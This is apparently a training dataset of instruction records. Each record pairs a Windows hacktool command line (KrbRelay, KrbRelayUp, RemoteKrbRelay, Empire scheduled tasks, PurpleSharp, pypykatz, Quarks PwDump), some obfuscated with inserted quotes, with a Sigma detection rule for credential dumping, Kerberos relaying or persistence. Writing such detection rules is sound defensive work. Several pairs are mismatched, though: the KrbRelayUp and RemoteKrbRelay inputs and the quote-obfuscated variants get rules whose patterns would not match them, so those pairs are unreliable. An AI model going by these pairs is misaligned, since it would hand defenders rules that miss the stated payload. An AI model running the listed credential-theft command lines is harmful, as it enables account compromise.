{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelayUp.exe KrbRelayUp.exe relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelayUp.exe KrbRela\"yUp.exe\" relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelayUp KrbRelayUp relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelayUp.exe KrbRelayUp.exe relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelay.exe KrbRelay.exe -spn -clsid -rbcd shadowcred clsid spn spn session clsid", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelay.exe KrbRelay.exe -spn -clsid -rbcd shadowcred clsid spn spn session \\\"cl\\\"sid", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelay KrbRelay -spn -clsid -rbcd shadowcred clsid spn spn session clsid", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\KrbRelay.exe KrbRelay.exe -spn -clsid -rbcd shadowcred clsid spn spn session clsid", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\RemoteKrbRelay.exe RemoteKrbRelay.exe -clsid -target -victim -smb --smbkeyword interactive secrets service-add -rbcd -cn --computername -chp -chpPass -chpUser -addgroupmember -group -groupuser", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\RemoteKrbRelay.exe RemoteKrbRelay.exe -clsid -target \\\"-victim\\\" -smb --smbkeyword interactive secrets service-add -rbcd -cn --computername -chp -chpPass -chpUser -addgroupmember -group -groupuser", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\RemoteKrbRelay RemoteKrbRelay -clsid -target -victim -smb --smbkeyword interactive secrets service-add -rbcd -cn --computername -chp -chpPass -chpUser -addgroupmember -group -groupuser", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\RemoteKrbRelay.exe RemoteKrbRelay.exe -clsid -target -victim -smb --smbkeyword interactive secrets service-add -rbcd -cn --computername -chp -chpPass -chpUser -addgroupmember -group -groupuser", "output": "title: HackTool - KrbRelay Execution\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nstatus: test\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\nreferences:\n    - https://github.com/cube0x0/KrbRelay\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1558.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\KrbRelay.exe'\n        - OriginalFileName: 'KrbRelay.exe' # In case the file has been renamed after compilation\n    selection_cli_1:\n        CommandLine|contains|all:\n            - ' -spn '\n            - ' -clsid '\n            - ' -rbcd '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'shadowcred'\n            - 'clsid'\n            - 'spn'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'spn '\n            - 'session '\n            - 'clsid '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\schtasks.exe /Create powershell.exe -NonI /TN Updater /TR /SC ONLOGON /SC DAILY /ST /SC ONIDLE /SC HOURLY", "output": "title: HackTool - Default PowerSploit/Empire Scheduled Task Creation\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: test\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018-03-06\nmodified: 2023-03-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\n    - attack.t1053.005\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - 'powershell.exe -NonI'\n            - '/TN Updater /TR'\n        CommandLine|contains:\n            - '/SC ONLOGON'\n            - '/SC DAILY /ST'\n            - '/SC ONIDLE'\n            - '/SC HOURLY'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\schtasks.exe /Create powershell.exe -NonI /TN Updater /TR /SC \"ONL\"OGON /SC DAILY /ST /SC ONIDLE /SC HOURLY", "output": "title: HackTool - Default PowerSploit/Empire Scheduled Task Creation\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: test\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018-03-06\nmodified: 2023-03-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\n    - attack.t1053.005\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - 'powershell.exe -NonI'\n            - '/TN Updater /TR'\n        CommandLine|contains:\n            - '/SC ONLOGON'\n            - '/SC DAILY /ST'\n            - '/SC ONIDLE'\n            - '/SC HOURLY'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell \\pwsh \\schtasks /Create powershell -NonI /TN Updater /TR /SC ONLOGON /SC DAILY /ST /SC ONIDLE /SC HOURLY", "output": "title: HackTool - Default PowerSploit/Empire Scheduled Task Creation\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: test\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018-03-06\nmodified: 2023-03-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\n    - attack.t1053.005\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - 'powershell.exe -NonI'\n            - '/TN Updater /TR'\n        CommandLine|contains:\n            - '/SC ONLOGON'\n            - '/SC DAILY /ST'\n            - '/SC ONIDLE'\n            - '/SC HOURLY'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\schtasks.exe /Create powershell.exe -NonI /TN Updater /TR /SC ONLOGON /SC DAILY /ST /SC ONIDLE /SC HOURLY", "output": "title: HackTool - Default PowerSploit/Empire Scheduled Task Creation\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: test\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018-03-06\nmodified: 2023-03-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\n    - attack.t1053.005\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/Create'\n            - 'powershell.exe -NonI'\n            - '/TN Updater /TR'\n        CommandLine|contains:\n            - '/SC ONLOGON'\n            - '/SC DAILY /ST'\n            - '/SC ONIDLE'\n            - '/SC HOURLY'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PurpleSharp.exe xyz123456.exe PurpleSharp", "output": "title: HackTool - PurpleSharp Execution\nid: ff23ffbc-3378-435e-992f-0624dcf93ab4\nstatus: test\ndescription: Detects the execution of the PurpleSharp adversary simulation tool\nreferences:\n    - https://github.com/mvelazc0/PurpleSharp\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-18\nmodified: 2023-02-05\ntags:\n    - attack.t1587\n    - attack.resource-development\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\purplesharp'\n        - OriginalFileName: 'PurpleSharp.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'xyz123456.exe'\n            - 'PurpleSharp'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PurpleSharp.exe \"xyz123\"456.exe PurpleSharp", "output": "title: HackTool - PurpleSharp Execution\nid: ff23ffbc-3378-435e-992f-0624dcf93ab4\nstatus: test\ndescription: Detects the execution of the PurpleSharp adversary simulation tool\nreferences:\n    - https://github.com/mvelazc0/PurpleSharp\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-18\nmodified: 2023-02-05\ntags:\n    - attack.t1587\n    - attack.resource-development\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\purplesharp'\n        - OriginalFileName: 'PurpleSharp.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'xyz123456.exe'\n            - 'PurpleSharp'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PurpleSharp xyz123456 PurpleSharp", "output": "title: HackTool - PurpleSharp Execution\nid: ff23ffbc-3378-435e-992f-0624dcf93ab4\nstatus: test\ndescription: Detects the execution of the PurpleSharp adversary simulation tool\nreferences:\n    - https://github.com/mvelazc0/PurpleSharp\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-18\nmodified: 2023-02-05\ntags:\n    - attack.t1587\n    - attack.resource-development\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\purplesharp'\n        - OriginalFileName: 'PurpleSharp.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'xyz123456.exe'\n            - 'PurpleSharp'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PurpleSharp.exe PurpleSharp xyz123456.exe", "output": "title: HackTool - PurpleSharp Execution\nid: ff23ffbc-3378-435e-992f-0624dcf93ab4\nstatus: test\ndescription: Detects the execution of the PurpleSharp adversary simulation tool\nreferences:\n    - https://github.com/mvelazc0/PurpleSharp\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-18\nmodified: 2023-02-05\ntags:\n    - attack.t1587\n    - attack.resource-development\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\purplesharp'\n        - OriginalFileName: 'PurpleSharp.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'xyz123456.exe'\n            - 'PurpleSharp'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pypykatz.exe \\python.exe live registry", "output": "title: HackTool - Pypykatz Credentials Dumping Activity\nid: a29808fd-ef50-49ff-9c7a-59a9b040b404\nstatus: test\ndescription: Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\nreferences:\n    - https://github.com/skelsec/pypykatz\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz\nauthor: frack113\ndate: 2022-01-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\pypykatz.exe\n            - \\python.exe\n        CommandLine|contains|all:\n            - 'live'\n            - 'registry'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"p\"\"y\"\"p\"\"y\"\"k\"\"a\"\"t\"\"z\"\".\"\"e\"\"x\"\"e\" \\python.exe live registry", "output": "title: HackTool - Pypykatz Credentials Dumping Activity\nid: a29808fd-ef50-49ff-9c7a-59a9b040b404\nstatus: test\ndescription: Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\nreferences:\n    - https://github.com/skelsec/pypykatz\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz\nauthor: frack113\ndate: 2022-01-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\pypykatz.exe\n            - \\python.exe\n        CommandLine|contains|all:\n            - 'live'\n            - 'registry'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pypykatz \\python live registry", "output": "title: HackTool - Pypykatz Credentials Dumping Activity\nid: a29808fd-ef50-49ff-9c7a-59a9b040b404\nstatus: test\ndescription: Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\nreferences:\n    - https://github.com/skelsec/pypykatz\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz\nauthor: frack113\ndate: 2022-01-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\pypykatz.exe\n            - \\python.exe\n        CommandLine|contains|all:\n            - 'live'\n            - 'registry'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pypykatz.exe live registry \\python.exe", "output": "title: HackTool - Pypykatz Credentials Dumping Activity\nid: a29808fd-ef50-49ff-9c7a-59a9b040b404\nstatus: test\ndescription: Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\nreferences:\n    - https://github.com/skelsec/pypykatz\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz\nauthor: frack113\ndate: 2022-01-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\pypykatz.exe\n            - \\python.exe\n        CommandLine|contains|all:\n            - 'live'\n            - 'registry'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuarksPwDump.exe", "output": "title: HackTool - Quarks PwDump Execution\nid: 0685b176-c816-4837-8e7b-1216f346636b\nstatus: test\ndescription: Detects usage of the Quarks PwDump tool via commandline arguments\nreferences:\n    - https://github.com/quarkslab/quarkspwdump\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\QuarksPwDump.exe\\\"", "output": "title: HackTool - Quarks PwDump Execution\nid: 0685b176-c816-4837-8e7b-1216f346636b\nstatus: test\ndescription: Detects usage of the Quarks PwDump tool via commandline arguments\nreferences:\n    - https://github.com/quarkslab/quarkspwdump\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
